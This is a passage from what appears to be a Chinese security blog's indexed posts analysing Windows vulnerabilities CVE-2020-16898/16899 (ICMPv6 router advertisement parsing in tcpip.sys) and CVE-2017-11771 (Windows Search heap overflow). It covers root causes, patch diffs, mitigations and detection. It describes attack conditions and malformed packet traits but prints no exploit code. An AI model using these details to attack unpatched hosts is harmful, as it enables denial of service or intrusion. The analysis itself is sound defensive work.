TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"4. 利用思路 1. 利用条件 基本条件 attacker需要获取target的IPv6和MAC地址 触发过程 attacker需要搭配其他内存泄漏或信息泄漏漏洞来实现RCE attacker需要想办法绕过tcpip.sys的GS保护机制 2. 利用过程 attacker直接发送特制的ICMPv6路由广播数据包给target： [ Attacker ] \u003c--------------------\u003e [ Target ] 3. 攻击向量 建立连接后，利用IPv6直接发送攻击数据包即可。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:4","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"5. 流量分析 因为该漏洞直接走的IPv6，所以对于一些部署在IP层以上的防火墙方案就无法针对该漏洞进行流量检测，但是具备IP层流量检测的防火墙可以轻松检测恶意流量： 在流量中可以明显看出，第一个Option结构的Address字段错误识别计算了一个Recursive DNS Server的值： 第1个Recursive DNS Server的地址为0018-0027，后续的8个字节不应该再进行识别。选中第2个Recursive DNS Server时情况如下： 第2个Recursive DNS Server的地址为0028-0037。但是该16个字节中的后8个字节很明显为下一个ICMPv6 Option结构的内容： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:5","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"四、缓解措施 管理员启动powershell或cmd，输入以下命令检查所有网络IPv6接口的列表以及相应的索引号： netsh int ipv6 sh int 样例输出如下： 确认网络接口的RDNSS功能开启情况： netsh int ipv6 sh int Idx number 执行以下命令关闭RDNSS功能(将Idx number替换为要关闭的网络接口的Idx值)： netsh int ipv6 set int Idx number rabaseddnsconfig=disable 样例输出如下： 此时再次确认接口的RDNSS开启情况，RDNSS功能已被关闭： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:4:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"五、参考文献 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 https://tools.ietf.org/html/rfc8106 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor/ ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:5:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"简单分析CVE-2020-16899","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析 [toc] ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:0:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows TCP/IP Denial of Service Vulnerability 漏洞编号：CVE-2020-16899 漏洞类型：Read out of Bound 漏洞影响：Denial of Service CVSS评分：7.5 利用难度：Medium 基础权限：不需要 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"2. 组件概述 TCP/IP是Internet上使用的通信协议。 在Windows的早期版本中，TCP/IP是一个单独的可选组件，可以像其他任何协议一样删除或添加。从Windows XP/Server 2003开始，TCP/IP成为操作系统的核心组件，无法删除。 将TCP/IP作为Windows的核心组件是非常有意义的，因为它的功能在Microsoft Windows Server上对网络操作和Active Directory域环境尤为重要。 整个Active Directory架构基于DNS层次结构，依赖于TCP/IP 传输协议 。 Microsoft Windows中的TCP/IP功能在内核级别运行，并由驱动程序tcpip.sys提供。该驱动程序处理所有传入和传出的TCP/IP通信信息，包括解析从网络接口接收到的数据包，并将其传递给更高级别的组件。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"3. 漏洞利用 该漏洞主要是由于Windows TCP/IP堆栈在处理选项类型为31(0x1f，DNS搜索表选项)的ICMPv6的路由广播数据包时，处理逻辑存在越界读，导致拒绝服务漏洞。攻击者成功利用该漏洞可使目标主机失去响应，但无法直接进行任意代码执行或权限提取。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:3","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"4. 漏洞影响 • Microsoft Windows 10 1709 • Microsoft Windows 10 1803 • Microsoft Windows 10 1809 • Microsoft Windows 10 1903 • Microsoft Windows 10 1909 • Microsoft Windows 10 2004 • Microsoft Windows Server 2019 • Microsoft Windows Server, version 1903 • Microsoft Windows Server, version 1909 • Microsoft Windows Server, version 2004 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:4","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"5. 解决方案 微软官方针对该漏洞已发布安全更新补丁，补丁地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16899 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:1:5","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"二、漏洞复现 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:2:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"1. 环境搭建 靶机：Windows 10 1809 x64 靶机操作：使用verifier开启tcpip.sys的验证 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:2:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"2. 复现过程 通过各种手段获取目标主机的IPv6地址和MAC地址（具体方法可自行探索，较为简单） 攻击机python3运行poc： 靶机crash： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:2:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"1. 基本信息 漏洞文件：tcpip.sys 漏洞函数： Ipv6pUpdateDNSSL()函数 漏洞对象：ICMPv6路由广播中的option结构(DNS Option structure) ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"2. 背景知识 (限于篇幅问题，此处不对用于DNS配置的IPv6路由广播进行详细介绍，更详细资料可参考RFC8106) 1. 基本知识 IPv6 Router Advertisment (RA) options，也称为DNS RA options，允许IPv6的路由器向IPv6的主机广播DNS Recursive Server Address(DNS递归路由器地址)列表和DNS Search List（DNS搜索列表），其主要用途为在IPv6的主机上进行DNS名称解析以及域后缀的处理。 IPv6 Neighbor Discovery(ND，IPv6邻居发现)和IPv6 Stateless Address Autoconfiguratioin(SLAAC，IPv6无状态地址自动配置)提供了使用一个或多个IPv6地址，默认路由器以及一些其他参数配置固定节点或移动节点的方法。 当漫游主机每次连接到另一个网络时，无法进行手动配置。 虽然可以进行静态配置，但是在诸如笔记本电脑之类的通用主机上通常不建议这样操作。 例如，如果主机运行直接连接到全局DNS的自己的递归名称服务器，那么本地定义的名称空间对主机来说就不可用了。访问DNS是几乎所有主机的基本要求，因此IPv6 SLAAC在没有任何DNS配置支持的情况下，不能在任何实际的网络环境中单独作为替代部署模型。 对于IPv4环境中的DNS服务器来说，这些问题都很容易解决。但是对于IPv6的网络环境，这些问题显得比较棘手。因此，RFC8106定义了一种基于DNS RA选项的机制，以允许IPv6主机执行自动DNS配置。 在通过IPv6 SLAAC自动配置IPv6主机地址并且没有DHCPv6基础结构或一些主机没有DHCPv6客户端的网络环境中，可以使用基于RA的DNS配置作为替代。 但是，对于需要分发其他信息的网络，可能仍然会使用DHCPv6。 在这些网络中，可能不需要基于RA的DNS配置。 基于RA的DNS配置允许IPv6主机获取主机连接到的链接的DNS配置（即DNS递归服务器地址和DNSSL）。 此外，主机会从提供链接配置信息的同一RA消息中学习此DNS配置。 2. 名词解释 Recursive DNS Server (RDNSS)：递归DNS服务器，提供递归DNS解析服务的服务器，用于将域名转换为IP地址或解析成RFC1034和RFC1035中定义的PTR记录。 RDNSS Option：一个用于向IPv6主机传送RDNSS信息的IPv6的RA option【RFC4861】。 DNS Search List (DNSSL)：IPv6主机在执行DNS查询搜索时使用的DNS后缀域名列表，用于搜索简短的不合格域名。 DNSSL Option：一个IPv6 RA选项，用于将DNSSL信息传递到IPv6主机。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"3. 详细分析 1. 基础分析 RFC8106标准化了DNSSL Option，该结构中包含DNS搜索列表(DNSSL)，保证与DHCPv6 option保持相同的奇偶校验，并确保具备确定搜索域的必要功能。 1. 邻居发现扩展 RFC8106中定义的在邻居发现中使用的IPv6 DNS配置算法需要用到2种ND options：RDNSS option和DNSSL option。与该漏洞相关的是DNSSL Option，另外一种则与 CVE-2020-16899相关。 2. DNSSL Option Structure DNSSL Option包含一个或多个DNS后缀，所有的domain name使用相同的Lifetime。如果需要不同的Lifetime值，则需要多个DNSSL Option结构。 DNSSL Option总体结构如下： Offset Size(bytes) Field Descriptioin 0x00 1 Type 8-bit，DNSSL Option type identifier，0x1f(31) 0x01 1 Length option长度（包括\"Type\"和\"Length\"字段），以8个八位位组为单位。最小值为2，此时option中仅有1个domain name。 0x02 2 Reserved 保留字段 0x04 4 Lifetime DNSSL中的domain name可用于名称解析的最长时间（以秒为单位）。默认情况下，该值至少为3 * MaxRtrAdvInterval，其中MaxRtrAdvInterval是RFC4861中定义的最大RA间隔。 0xffffffff表示无穷大， 零值意味着必须不再使用domain names。 0x08 8 Domain Names of DNS Search List 一个或多个domain name。 对于Length字段，如果option中仅有一个domain name，则为最小值为2。 Domain Names of DNS Search List字段中的domain name的编码要遵循RFC1035的3.1节中定义的格式： 多个domian name直接相连。 3. Procedure in IPv6 Hosts 当主机接收到RA消息中的DNS的options时，其处理过程如下： 首先检查Lengh字段的合法性：是否大于等于最小值2； 如果以上验证通过，则主机应按顺序将选项的值复制到DNS存储库和解析器存储库中。 否则，主机必须丢弃这些选项。 4. Crash分析 首先分析dmp文件，查看crash现场： CallStack直接给出了函数的调用链： Icmpv6ReceiveDatagrams() -\u003e Ipv6pHandleRouterAdvertisement() -\u003eIpv6pUpdateDNSSL() -\u003e GetNextSuffixFromOption() 最终是在GetNextSuffixFromOption()函数中报了内存页错误，导致最终的crash。 5. 漏洞原因 Windows IPv6堆栈为DNSSL中的每个domain name分配一个256字节的buffer。 RFC 1035将域名限制为255个字节，因此domain name长度加上末尾的空字符刚好可以满足buffer的大小要求。 但是，漏洞代码处理该部分数据时，其上限等于DNSSL Option中的剩余字节，可以超过256个字节。因此，漏洞代码可能会错误地消耗比为buffer分配的字节更多的字节，从而导致越界读。 如果buffer位于一个memory page的末尾，则该OOB读取就会导致BSOD。 2. 漏洞函数分析 分析使用的文件为Windows 10 1809 x64的tcpip.sys文件，版本为10.0.17763.316。 经过简单分析可以确认，调用链的顶层函数Icmpv6ReceiveDatagrams()没有实质性的与漏洞触发密切相关的处理逻辑，故而跳过。 1. Ipv6pHandleRouterAdvertisement() 在Ipv6pHandleRouterAdvertisement()函数中先对传入的RA消息做预处理，然后根据不同类型的option进入不同的处理流程： 2. Ipv6pUpdateDNSSL() 首先读取Option结构的数据以及Domain name的长度： 接下来，确认读取的数据后，处理后缀部分： 这里在计算Suffixes的长度时，BytesToRead会被限制在0x100字节长度范围内，也就是Suffixes的最大长度为256。然后调用GetNextSuffixFromOption()函数读取Suffix。 3. GetNextSuffixFromOption() 在该函数中，在解析完一个DNS记录后，代码逻辑会来到以下位置： 这里的主要作用是跳过Domain Name中的空字符部分，遇到0就跳过，读取下一个数据，直到遇到非0值。但是在进行边界检查时，使用的条件参数BytesToRead_1是可以进行控制的，从而可以实现绕过，进行越界读。 3. 动态分析 Ipv6pUpdateDNSSL()函数下断，然后发送poc后断下，检查CallStack，确认断点触发流程与静态分析中的函数调用链一致： 此时的各寄存器情况如下： 这里重点看下rdx寄存器中的内容（漏洞函数的第2个参数）： rdx中存放的是一个_NET_BUFFER结构，其详细结构如下： typedef struct _NET_BUFFER { union { struct { PNET_BUFFER Next; PMDL CurrentMdl; ULONG CurrentMdlOffset; union { ULONG DataLength; SIZE_T stDataLength; }; PMDL MdlChain; ULONG DataOffset; }; SLIST_HEADER Link; NET_BUFFER_HEADER NetBufferHeader; }; USHORT ChecksumBias; USHORT Reserved; NDIS_HANDLE NdisPoolHandle; PVOID NdisReserved[2]; PVOID ProtocolReserved[6]; PVOID MiniportReserved[4]; NDIS_PHYSICAL_ADDRESS DataPhysicalAddress; union { PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo; PSCATTER_GATHER_LIST ScatterGatherList; }; } NET_BUFFER, *PNET_BUFFER; 而且在其中找到了触发漏洞的ICMPv6的相关数据。继续向下，来到NdisGetDataBuffer()函数的第1处调用： NdisGetDataBuffer()函数的第1个参数为传入的_NET_BUFFER结构。NdisGetDataBuffer()函数声明如下： PVOID NdisGetDataBuffer( PNET_BUFFER NetBuffer, // [in], a pointer to a NetBuffer structure ULONG BytesNeeded, // [in], the number of contiguous bytes of data requested PVOID Storage, // [in, optional], a pointer to a buffer, or NULL if no buffer is provided by the caller UINT AlignMultiple, // [in], the alignment multiple expressed in power of two. For example, 2, 4, 8, 16, and so forth. If AlignMultiple is 1, then there is no alignment requirement. UINT AlignOffset // [in], the offset, in bytes, from the alignment multiple. ); // Return Value A pointer to the start of the contiguous data or NULL. 如果NetBuffer参数指向的NET_BUFFER结构中的NET_BUFFER_DATA部分的DataLength字段的值小于BytesNeeded参数的值，那么函数返回NULL。函数执行完成后，返回结果如下： 返回的恰好为DNSSL Option的地址。 然后调用NetioAdvanceNetBuffer()函数。执行NetioAdvanceNetBuffer()函数之前，_NET_BUFFER的结构如下所示： 在执行完NetioAdvanceNetBuffer()函数后，结构变为： 此处该函数主要作用是前进8个字节进行数据读取，其整体流程及部分关键参数值如下： 继续向下，通过Length字段计算BytesToRead的长度，并对Lifetime的值进行是否为0xffffffff的检查： 后续会进行一些上下文初始化、事件记录等操作，然后进入循环，开始处理Opt","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:3","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"4. 利用思路 1. 利用条件 基本条件 attacker需要获取target的IPv6和MAC地址 触发过程 attacker可以直接发起远程攻击 2. 利用过程 attacker直接发送特制的ICMPv6路由广播数据包给target： [ Attacker ] \u003c--------------------\u003e [ Target ] 3. 攻击向量 建立连接后，利用IPv6直接发送攻击数据包即可。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:4","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"5. 流量分析 因为该漏洞直接走的IPv6，所以对于一些部署在IP层以上的防火墙方案就无法针对该漏洞进行流量检测，但是具备IP层流量检测的防火墙可以轻松检测恶意流量： 使用大量的0进行填充以触发漏洞。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:5","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"6. 补丁分析 1. 补丁对比结果 针对Ipv6pUpdateDNSSL()函数的补丁对比结果如下： 2. 补丁思路 根据补丁对比结果，微软新增了对BytesToRead值的校验，在读取完Suffixes之后，为确保不发生越界读，新增了一次对BytesToRead的校验，确保小于0x100。而在漏洞分析中，触发漏洞时该值是大于0x100的。 3. 补丁验证 使用安装更新补丁后的Ipv6UpdateDNSSL()函数进行验证，新增保证BytesToRead的值最大为0x100的代码： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:6","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"四、缓解措施 管理员启动powershell或cmd，输入以下命令检查所有网络IPv6接口的列表以及相应的索引号： netsh int ipv6 sh int 样例输出如下： 确认网络接口的RDNSS功能开启情况： netsh int ipv6 sh int Idx number 执行以下命令关闭RDNSS功能(将Idx number替换为要关闭的网络接口的Idx值)： netsh int ipv6 set int Idx number rabaseddnsconfig=disable 样例输出如下： 此时再次确认接口的RDNSS开启情况，RDNSS功能已被关闭： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:4:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"五、漏洞检测和防御 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:5:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"1. 漏洞检测 针对该漏洞，目前暂未发现漏洞原理侧的无损检测。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:5:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"2. 漏洞防御 1. 防御思路 流量防御：需要监控IPv6的流量传输，对于Type为134的路由广播数据包进行检测，确认其Type为0x1f的DNSSL的Padding部分是否有大于等于256个0字符。 终端防御：根据补丁对比结果，可以按照微软的补丁思路使用热补丁进行防御，对BytesToRead的值再加一次校验。 2. 可能存在的风险 暂时未知。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:5:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"六、参考文献 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16899 https://tools.ietf.org/html/rfc8106 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:6:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"简单分析CVE-2017-11771","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:0:0","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:0","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows Search 堆溢出漏洞 漏洞编号：CVE-2017-11771；Bugtraq ID：101114 漏洞类型：Remote Code Execution ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:1","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"2. 组件概述 Windows搜索是一个桌面搜索平台，具有针对大多数常见文件类型和数据类型的即时搜索功能。 它的主要组件是WSearch Windows Service，它负责索引，组织和提取有关本地文件系统的信息。 此外，它实现了通用搜索服务（GSS），它是向搜索查询提供结果所需的后端功能。 客户端使用Windows搜索协议（WSP）向托管GSS的服务器发出查询。 WSP依靠名为管道协议的服务器消息块（SMB）进行消息传输和身份验证。 Microsoft Windows的所有版本均附带服务器消息块（SMB）协议的实现。 SMB是本机Windows网络框架，支持文件共享，网络打印，远程过程调用和其他功能。在Windows系统上，SMB协议通过附加的安全性，文件和磁盘管理支持扩展了CIFS协议。 通过各种SMB命令和子命令类型提供这些功能。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:2","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"3. 漏洞利用 Windows Search服务在处理内存中的对象时存在缺陷，会造成堆溢出。远程未经过认证的攻击者可以通过向目标主机发起一个恶意请求实现任意代码执行，成功的攻击可以获得目标主机的SYSTEM权限。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:3","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"4. 漏洞影响版本 • Microsoft Windows 7 • Microsoft Windows 8 • Microsoft Windows 8.1 • Microsoft Windows 10 • Microsoft Windows Server 2003 • Microsoft Windows Server 2008 • Microsoft Windows Server 2012 • Microsoft Windows Server 2016 • Microsoft Windows Vista • Microsoft Windows XP ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:4","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"5. 解决方案 获取微软官方针对此漏洞的安全补丁，地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11771 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:5","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"二、漏洞复现 暂无 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:2:0","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"1. 环境搭建 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:2:1","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"2. 复现过程 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:2:2","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:0","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"1. 漏洞基本信息 漏洞文件：tquery.dll 漏洞函数：CFixedVarBufferAllocator::CFixedVarBufferAllocator() 漏洞参数：cbReadBuffer and cbReserved 漏洞对象：堆分配的buffer ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:1","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"2. 背景知识 备注：此处略去SMB相关介绍，漏洞自身与SMB关系不大，SMB只是作为WSP传输的工具协议，使用的pipe名称为MsFteWds。 Windows Search Protocol(WSP) 使用WSP的最小搜索查询其流程大概如下： [ Client ] --------------------\u003e [ Server ] - CPMConnectIn [ Client ] \u003c-------------------- [ Server ] - CPMConnectOut [ Client ] --------------------\u003e [ Server ] - CPMCreateQueryIn [ Client ] \u003c-------------------- [ Server ] - CPMCreateQueryOut [ Client ] --------------------\u003e [ Server ] - CPMSetBindingsIn request [ Client ] \u003c-------------------- [ Server ] - CPMSetBindingsIn response [ Client ] --------------------\u003e [ Server ] - CPMGetRowsIn [ Client ] \u003c-------------------- [ Server ] - CPMGetRowsOut [ Client ] --------------------\u003e [ Server ] - CPMGetFreeCursorIn [ Client ] \u003c-------------------- [ Server ] - CPMGetFreeCursorOut [ Client ] --------------------\u003e [ Server ] - CPMDisconnect CPMConnectIn消息开始于客户端和服务器之间的会话，CPMCreateQueryIn包含查询条件并创建新查询，CPMSetBindingsIn指定如何在CPMGetRowsOut中构建搜索结果，CPMGetRowsIn从服务器返回的查询结果中请求数据。 所有的WSP消息以一个16字节的头部开始，其结构如下： Offset Size (bytes) Field -------------------------------------------- 0x00 0x4 _msg 0x04 0x4 _status 0x08 0x4 _ulChecksum 0x0c 0x4 _ulReserved2 _msg字段标识标头部后面的消息类型（有的一个value表示两种类型，此时要根据数据流的传输方向判定具体代表哪种类型。带\"In\"字符的是从client到server，带\"Out\"字符的是从server到client）； _status字段表明所请求操作的状态，由服务器填充； _ulChecksum包含从_ulReserved2字段后面开始的消息的校验和； _ulReserved2字段除了后续的消息为CPMGetRowsIn之外，都必须设置为0。 与本漏洞相关的是CPMGetRowsIn消息。该消息主要用于从查询中请求数据行(row)，其详细格式如下： Offset Size (bytes) Field ------------------------------------------ 0x00 0x4 hCursor 0x04 0x4 cRowsToTransfer 0x08 0x4 cbRowWidth 0x0c 0x4 cbSeek 0x10 0x4 cbReserved 0x14 0x4 cbReadBuffer 0x18 0x4 ulClientBase 0x1c 0x4 fBwdFetch 0x20 0x4 eType 0x24 0x4 chapt 0x28 variable SeekDescription cRowsToTransfer字段指定CPMGetRowsOut消息中包括多少row，cbRowWidth字段表示row的长度（以字节为单位），cbReserved字段指定结果在CPMGetRowsOut消息中的偏移量(与cbSeek字段相加然后进行计算偏移)，cbReadBuffer字段指定 CPMGetRowsOut消息中的数据大小，以字节为单位，该字段必须设置为_cbRowWidth值的最大值或_cRowsToTransfer值的1000倍，四舍五入到最接近的512字节倍数。 该值不得超过0x00004000。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:2","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"3. 详细分析 server接收到CPMGetRowsIn消息后，首先检查cbReserved的值是否小于cbReadBuffer。然后调用CFixedVarBufferAllocator::CFixedVarBufferAllocator()来初始化buffer，该buffer中应该有相应的CPMGetRowsOut消息。该函数会使用下面的方式对结果数据进行初始位置和结束位置的计算： resultDataStart = buffer + cbReversed resultDataEnd = buffer + cbReadBuffer 如果计算出的resultDataEnd不是8字节对齐的，则函数一次从resultDataEnd减去一个字节，直到对齐为止。 但是，在返回分配的buffer前，函数没有对resultDataEnd是否大于等于resultDataStart进行验证，直接调用了CFixedVarBufferAllocator::CFixedVarBufferAllocator()函数进行初始化buffer的chunk分配。AllocFixed()函数使用下面的方式来确认buffer中是否有足够空间： resultDataEnd - resultDataStart \u003c cbRowWidth 因为CFixedvarBufferAllocator()没有进行两个字段大小的比较，所以有可能会出现resultDataEnd小于resultDataStart的情况，这样当两个字段进行减法运算的时候就会造成溢出。然后会调用AllocFixed()函数进行内存分配，但是此时的buffer的offset有可能是错误的。当row被复制到分配的chunk时，数据会被写到buffer的末尾，最终导致一个堆溢出。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:3","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"4. 源码分析 # CRequestServer::DoGetRows(): .text:62A6912A mov eax, 